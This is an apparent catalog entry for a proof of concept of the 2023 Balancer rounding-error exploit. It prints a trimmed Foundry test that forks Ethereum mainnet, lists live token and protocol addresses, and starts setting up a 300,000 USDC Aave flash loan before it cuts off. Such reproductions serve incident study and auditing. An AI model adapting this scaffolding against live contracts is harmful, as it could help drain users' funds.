# [?] Balancer - Rounding Error && Business Logic Flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: Balancer
Published: 2023-08-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Balancer_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$2M

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IERC20 aUSDC = IERC20(0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de);
    IERC20 aDAI = IERC20(0x02d60b84491589974263d922D9cC7a3152618Ef6);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    BBToken bbaUSDC = BBToken(0x9210F1204b5a24742Eba12f710636D76240dF3d0);
    BBToken bbaDAI = BBToken(0x804CdB9116a10bB78768D3252355a1b18067bF8f);
    BBToken bbaUSDT = BBToken(0x2BBf681cC4eb09218BEe85EA2a5d3D13Fa40fC0C);
    IERC20 bbaUSD = IERC20(0x7B50775383d3D6f0215A8F290f2C9e2eEBBEceb2);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_004_651);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(aave), "AAVE");
        vm.label(address(balancer), "Balancer");
        vm.label(address(bbaUSDC), "bb-a-USDC");
        vm.label(address(bbaDAI), "bb-a-DAI");
        vm.label(address(bbaUSD), "bb-a-USD");
        vm.label(address(bbaUSDT), "bb-a-USDT");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 300_000 * 1e6;
        uint256[] memory interestRateModes = new uint256[](2);
        interestRateModes[0] = 0;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Balancer_exp.sol_
